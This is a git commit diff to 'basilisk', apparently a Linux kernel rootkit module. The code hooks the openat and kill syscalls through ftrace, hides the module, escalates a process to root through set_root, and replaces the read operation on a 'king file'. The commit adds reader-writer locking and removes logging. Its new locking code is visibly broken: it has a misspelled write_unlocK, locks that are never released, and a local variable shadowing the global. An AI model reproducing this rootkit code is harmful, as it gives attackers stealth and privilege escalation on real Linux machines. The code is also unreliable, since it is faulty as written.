23c3fa359535530d4c268ad4ce3c6a678400444e
skelly <skelly@arch.org>
2024-08-02 00:33:11 +0300

    Used RW locks to prevent race conditions inside `hook_open`.

--- src/basilisk.c
+++ src/basilisk.c
@@ -12,7 +12,7 @@
 #include <linux/fs.h>
 #include <linux/path.h>
 #include <linux/namei.h>
-
+#include <linux/rwlock.h>
 
 #include "include/ftrace_helper.h"
 #include "include/stealth_helper.h"
@@ -35,6 +35,14 @@ MODULE_VERSION("0.02");
 #endif
 
 static short hidden = 0;
+struct file_operations *king_fops;
+static DEFINE_RWLOCK(king_fops_lock);
+
+/* Cleanup the king_fops struct*/
+static void cleanup_new_fops(void) {
+    kfree(king_fops); 
+    king_fops = NULL; // prevent dangling pointer access
+}
 
 static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
@@ -63,7 +71,7 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     umode_t mode = regs->r10;
 
     struct file *file;
-    struct file_operations *new_f_ops;
+    struct file_operations *king_fops;
     struct path path;
 
     char *resolved_path;
@@ -99,19 +107,12 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
     }
 
     if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
-        pr_alert("basilisk: opening king file: %s\n", full_path);
         // Get file descriptor 
         fd = orig_openat(dfd, filename, flags, mode);
-        if (fd < 0) {
-            pr_alert("basilisk: failed to open file: %s\n", kfilename);
+        if (fd == 0 || fd == 1 || fd == 2 || fd < 0) { // make sure we are not messing with STDIN, STDOUT, STDERR or some error happened
             path_put(&path);
             kfree(resolved_path);
             return fd; 
-        }
-        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
-            path_put(&path);
-            kfree(resolved_path);
-            return orig_openat(dfd, filename, flags, mode);
         }
         // Get associated file struct (fget)
         file = fget(fd);
@@ -123,16 +124,18 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
         }
 
 
-        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
-        if (!new_f_ops) {
-            fput(file);
-	    path_put(&path);
-	    kfree(resolved_path);
-            pr_alert("Failed to allocate memory for new file_operations\n");
-            return orig_openat(dfd, filename, flags, mode);
-        }
-        new_f_ops->read = hook_read;
-        file->f_op = new_f_ops;
+        if (!king_fops) {
+	    king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
+	    if (!king_fops) {
+		fput(file);
+		path_put(&path);
+		kfree(resolved_path);
+		pr_alert("Failed to allocate memory for new file_operations\n");
+		return orig_openat(dfd, filename, flags, mode);
+	    }
+	}
+        king_fops->read = hook_read;
+        file->f_op = king_fops;
         
         fput(file);
         path_put(&path);
@@ -152,13 +155,15 @@ static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int 
 static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
 {
     struct file *file;
-    struct file_operations *new_f_ops;
     struct path path;
 
     char *resolved_path;
     long error;
 
     char kfilename[PATH_MAX];
+    int fd;
+    char *full_path;
+    
     error = strncpy_from_user(kfilename, filename, PATH_MAX);
     if (error < 0) {
         pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
@@ -175,7 +180,7 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
         kfree(resolved_path);
         return error;
     }
-    char *full_path = d_path(&path, resolved_path, PATH_MAX);
+    full_path = d_path(&path, resolved_path, PATH_MAX);
     if (IS_ERR(full_path)) {
         path_put(&path);
         kfree(resolved_path);
@@ -183,38 +188,42 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
     }
 
     if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
-        pr_alert("basilisk: opening king file: %s\n", full_path);
-        // Get file descriptor 
-        int fd = orig_openat(dfd, filename, flags, mode);
-        if (fd < 0) {
-            pr_alert("basilisk: failed to open file: %s\n", kfilename);
+        fd = orig_openat(dfd, filename, flags, mode);
+        if (fd == 0 || fd == 1 || fd == 2 || fd < 0) { 
             path_put(&path);
             kfree(resolved_path);
             return fd; 
         }
-        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
-            path_put(&path);
-            kfree(resolved_path);
-            return orig_openat(dfd, filename, flags, mode);
-        }
-        // Get associated file struct (fget)
         file = fget(fd);
         if (!file) {
             pr_err("basilisk: failed to get file structure from file descriptor\n");
             path_put(&path);
             kfree(resolved_path);
-            return orig_openat(dfd, filename, flags, mode);
+            return orig_openat(dfd, filename, flags, mode); 
         }
 
-
-        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
-        if (!new_f_ops) {
-            fput(file);
-            pr_alert("Failed to allocate memory for new file_operations\n");
-            return orig_openat(dfd, filename, flags, mode);
+	    read_lock(&king_fops_lock);
+        if (!king_fops) {
+            read_unlock(&king_fops_lock);
+            write_lock(&king_fops_lock);
+            
+            king_fops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
+            if (king_fops) {
+                king_fops->read = hook_read;
+            } else {
+                pr_alert("Failed to allocate memory for new file_operations\n");
+                write_unlocK(&king_fops_lock);
+                return fd;
+	        }
+	    }
+        read_lock(&king_fops_lock);
+        if (king_fops != file->f_op) {
+            read_unlock(&king_fops_lock);
+            write_lock(&king_fops_lock);
+            file->f_op = king_fops;
+        } else {
+            read_unlock(&king_fops_lock);
         }
-        new_f_ops->read = hook_read;
-        file->f_op = new_f_ops;
         
         fput(file);
         path_put(&path);
@@ -306,13 +315,9 @@ asmlinkage int hook_kill(pid_t pid, int sig)
 }
 #endif
 
-/* Add this LKM back to the loaded module list, at the point
- * specified by prev_module */
-
-/* Record where we are in the loaded module list by storing
- * the module prior to us in prev_module, then remove ourselves
- * from the list */
-
+/*
+Helper functions to handle the hiding/showing of our LKM 
+*/
 void hide_basilisk(void)
 {
     proc_hide();
@@ -328,20 +333,21 @@ void show_basilisk(void)
 
 void set_root(void)
 {
-        struct cred *root;
-        root = prepare_creds();
+    struct cred *root;
+    root = prepare_creds();
 
-        if (root == NULL)
-                return;
+    if (root == NULL)
+            return;
 
-        // Set credentials to root
-        root->uid.val = root->gid.val = 0;
-        root->euid.val = root->egid.val = 0;
-        root->suid.val = root->sgid.val = 0;
-        root->fsuid.val = root->fsgid.val = 0;
+    // Set credentials to root
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
 
-        commit_creds(root);
+    commit_creds(root);
 }
+
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
@@ -360,13 +366,13 @@ static int __init basilisk_init(void)
         return err;
 
     pr_info("basilisk: loaded\n");
-
     return 0;
 }
 
 static void __exit basilisk_exit(void)
 {
-    /* Unhook and restore the syscall and print to the kernel buffer */
+    cleanup_new_fops();
+    /* Unhook and restore the syscalls */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "basilisk: unloaded\n");
 }
